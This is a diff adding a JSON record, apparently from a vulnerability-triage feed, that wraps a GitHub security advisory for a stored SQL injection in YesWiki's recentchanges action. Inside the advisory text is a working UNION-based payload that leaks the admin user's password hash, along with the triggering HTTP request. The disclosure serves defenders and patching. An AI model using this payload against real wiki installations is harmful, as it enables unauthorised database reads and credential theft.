@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/217740635?v=4\", \"events_url\": \"https://api.github.com/users/CosmicCrusader23/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/CosmicCrusader23/followers\", \"following_url\": \"https://api.github.com/users/CosmicCrusader23/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/CosmicCrusader23/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/CosmicCrusader23\", \"id\": 217740635, \"login\": \"CosmicCrusader23\", \"node_id\": \"U_kgDODPp1Ww\", \"organizations_url\": \"https://api.github.com/users/CosmicCrusader23/orgs\", \"received_events_url\": \"https://api.github.com/users/CosmicCrusader23/received_events\", \"repos_url\": \"https://api.github.com/users/CosmicCrusader23/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/CosmicCrusader23/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/CosmicCrusader23/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/CosmicCrusader23\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-52763\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-89\", \"name\": \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"}, {\"cwe_id\": \"CWE-1287\", \"name\": \"Improper Validation of Specified Type of Input\"}], \"description\": \"### Summary\\n\\nThe `recentchanges` action (`actions/recentchanges.php`) accepts a `period` argument from two disjoint parameter spaces: the URL query string (`$_GET['period']`) and the action invocation `{{recentchanges period=\\\"...\\\"}}`. A whitelist at line 17 validates only the URL form against `['day','week','month']`. The action-argument form takes the `else` branch at line 33 (`$dateMin = $this->GetParameter('period')`) with no validation, and the value flows into `PageManager::getRecentlyChanged()` (`includes/services/PageManager.php:196`), where it is interpolated into a `WHERE time >= '...' ORDER BY time DESC` clause without escaping or parameterization. UNION-based injection succeeds, the leaked rows render into the response page via `actions/recentchanges.php:43,58` (`ComposeLinkToPage($page['tag'])`), so any visitor of the trigger page sees the exfiltrated data.\\n\\nThe vulnerability provides arbitrary read of the YesWiki database to anyone who can save the trigger page. On a default install (`default_write_acl='*'`), this includes anonymous users, subject to the hashcash JS check on the page-edit form. Once the trigger page is saved, every subsequent view fires the injection as the SQLi is stored. Stored SQL injection is reachable through the page-edit flow, with arbitrary database read.\\n\\n### Details\\n\\nTwo issues compose the vulnerability.\\n\\n1. `actions/recentchanges.php` line 33 reads the action argument and skips the whitelist.\\n\\n   ```php\\n   if (isset($_GET['period']) && in_array($_GET['period'], ['day', 'week', 'month'])) {\\n       switch ($_GET['period']) {\\n           case 'day':   $d = strtotime('-1 day');   $dateMin = date('Y-m-d H:i:s', $d); break;\\n           case 'week':  $d = strtotime('-1 week');  $dateMin = date('Y-m-d H:i:s', $d); break;\\n           case 'month': $d = strtotime('-1 month'); $dateMin = date('Y-m-d H:i:s', $d); break;\\n       }\\n   } else {\\n       $dateMin = $this->GetParameter('period');   \\n   }\\n   ```\\n\\n   `Wiki::GetParameter()` (`includes/YesWiki.php:895`) reads `$this->parameter[$key]`, which is populated from the `{{action key=value}}` argument list — disjoint from `$_GET`. The whitelist's `if` branch only runs when `$_GET['period']` matches one of three exact values; in every other case the `else` branch reads the action argument with no validation, no escaping, no DateTime parse, no regex. The two parameter spaces are independent.\\n\\n2.  In `includes/services/PageManager.php`, `PageManager::getRecentlyChanged()` interpolates the value into SQL.\\n\\n   ```php\\n   public function getRecentlyChanged($limit = 50, $minDate = ''): ?array\\n   {\\n       if (!empty($minDate)) {\\n           if ($pages = $this->dbService->loadAll(\\n               'select id, tag, time, user, owner from' . $this->dbService->prefixTable('pages')\\n               . \\\"where latest = 'Y' and comment_on = '' and time >= '$minDate' order by time desc\\\"\\n           )) {\\n               return $pages;\\n           }\\n       }\\n   }\\n   ```\\n\\n   `$minDate` is interpolated raw into the query and there is no `$this->dbService->escape($minDate)` and no parameter binding and no format check.\\n\\nThe default action ACL for `recentchanges` is `*` (`includes/YesWiki.php:1100`, `GetModuleACL`), so `Performer::CheckModuleACL('recentchanges', 'action')` returns `true` for everyone. The injection runs whenever a viewer reaches a page that embeds the action with a malicious `period` argument.\\n\\n### PoC\\n\\nDefault fresh install so `default_write_acl='*'`.\\n1. place the SQLi payload on a page\\n\\n```\\n{{recentchanges period=\\\"2000-01-01' UNION SELECT 9999 AS id, CONCAT('LEAK_', name, '_', SUBSTRING(password,1,32)) AS tag, NOW() AS time, name AS user, name AS owner FROM yeswiki_users WHERE name='AdminUser' -- \\\"}}\\n```\\n\\nThe five UNION columns match the `id, tag, time, user, owner` projection that `getRecentlyChanged` selects. The `tag` column is rendered into the response as a hyperlink, exfiltrating the leaked data.\\n\\n2. anyone visits the page\\n\\n```http\\nGET /?<TriggerPage> HTTP/1.1\\nHost: target.example\\n```\\n\\nThe injected query executes server-side; the `tag` column is rendered into the page in `actions/recentchanges.php:43,58` via `ComposeLinkToPage($page['tag'])`.\\n\\n### Impact\\n\\nArbitrary read of any DB column the application's MySQL user can access.\", \"epss\": {\"percentage\": 0.00044, \"percentile\": 0.13912}, \"ghsa_id\": \"GHSA-89v6-j5x6-cmj3\", \"github_reviewed_at\": \"2026-07-09T20:54:46Z\", \"html_url\": \"https://github.com/advisories/GHSA-89v6-j5x6-cmj3\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-89v6-j5x6-cmj3\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-52763\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-09T20:54:46Z\", \"references\": [\"https://github.com/YesWiki/yeswiki/security/advisories/GHSA-89v6-j5x6-cmj3\", \"https://github.com/YesWiki/yeswiki/commit/5da27474c3ee62270c8a6b9d7055d494cdbd38e5\", \"https://github.com/advisories/GHSA-89v6-j5x6-cmj3\"], \"repository_advisory_url\": \"https://api.github.com/repos/YesWiki/yeswiki/security-advisories/GHSA-89v6-j5x6-cmj3\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/YesWiki/yeswiki\", \"summary\": \"YesWiki: SQL injection via the `recentchanges` action `period` argument leads to arbitrary DB read\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-09T20:54:46Z\", \"url\": \"https://api.github.com/advisories/GHSA-89v6-j5x6-cmj3\", \"vulnerabilities\": [{\"first_patched_version\": \"4.6.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"yeswiki/yeswiki\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.6.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-89v6-j5x6-cmj3",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "yeswiki/yeswiki: < 4.6.6"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-52763"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "yeswiki/yeswiki"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.473139Z",
+  "provenance": {
+    "content_sha256": "9b1182cf6b4081bac7280a4eda44348fd0f9cb01a06ed9e5ac204a1cdbbc659a",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-09T20:54:46Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-89v6-j5x6-cmj3",
+  "status": "active",
+  "title": "YesWiki: SQL injection via the `recentchanges` action `period` argument leads to arbitrary DB read",
+  "updated_at": "2026-07-09T20:54:46Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-89v6-j5x6-cmj3"
+}
